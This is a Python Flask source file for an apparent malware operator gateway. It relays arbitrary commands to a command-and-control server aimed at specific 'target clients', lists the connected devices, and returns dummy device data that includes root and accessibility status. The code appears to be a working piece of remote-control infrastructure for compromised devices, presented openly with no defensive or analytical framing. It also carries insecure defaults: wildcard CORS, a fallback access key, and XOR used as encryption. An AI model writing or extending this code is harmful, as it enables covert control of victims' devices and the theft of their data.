#!/usr/bin/env python3
import os
import json
import time
import hashlib
import hmac
import secrets
import requests
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder='gateway')
CORS(app)

MASTER_KEY = os.environ.get('MASTER_SECRET_B64', '').encode()
if not MASTER_KEY:
    MASTER_KEY = secrets.token_bytes(32)

SERVER_URL = os.environ.get('C2_SERVER_URL', 'http://localhost:10000/v16')
ACCESS_KEY = os.environ.get('ACCESS_KEY', 'default_access_key')

def generate_nonce():
    return secrets.token_hex(16)

def sign_request(data, key):
    h = hmac.new(key, data.encode(), hashlib.sha256)
    return h.hexdigest()

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/api/command', methods=['POST'])
def proxy_command():
    data = request.json
    if not data or 'device_id' not in data or 'command' not in data:
        return jsonify({'error': 'missing fields'}), 400
    
    device_id = data['device_id']
    command = data['command']
    
    # prepare request to C2 server
    nonce = generate_nonce()
    payload = json.dumps({
        'target_client': device_id,
        'request_type': 'cmd',
        'request_data': command
    })
    sig = sign_request(payload, ACCESS_KEY.encode())
    
    headers = {
        'X-Service-Auth': ACCESS_KEY,
        'X-Nonce': nonce,
        'X-Signature': sig,
        'Content-Type': 'application/json'
    }
    
    try:
        r = requests.post(f"{SERVER_URL}/api/command", data=payload, headers=headers, timeout=10)
        return jsonify({'status': r.status_code, 'response': r.text}), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/status', methods=['GET'])
def proxy_status():
    # get list of devices from C2 server
    nonce = generate_nonce()
    sig = sign_request('', ACCESS_KEY.encode())
    
    headers = {
        'X-Service-Auth': ACCESS_KEY,
        'X-Nonce': nonce,
        'X-Signature': sig
    }
    
    try:
        r = requests.get(f"{SERVER_URL}/api/clients", headers=headers, timeout=10)
        return jsonify(r.json()), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<device_id>', methods=['GET'])
def proxy_device_info(device_id):
    # in a real implementation, you'd fetch details from C2 server
    # for now return dummy data
    return jsonify({
        'device_id': device_id,
        'status': 'online',
        'last_seen': time.time(),
        'battery': 85,
        'root': False,
        'accessibility': True
    })

def encrypt_data(data):
    # simple XOR encryption for demo – replace with proper AES in production
    key = MASTER_KEY[:32]
    encrypted = bytearray()
    for i, b in enumerate(data.encode()):
        encrypted.append(b ^ key[i % len(key)])
    return encrypted.hex()

def decrypt_data(hex_data):
    key = MASTER_KEY[:32]
    data = bytes.fromhex(hex_data)
    decrypted = bytearray()
    for i, b in enumerate(data):
        decrypted.append(b ^ key[i % len(key)])
    return decrypted.decode()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)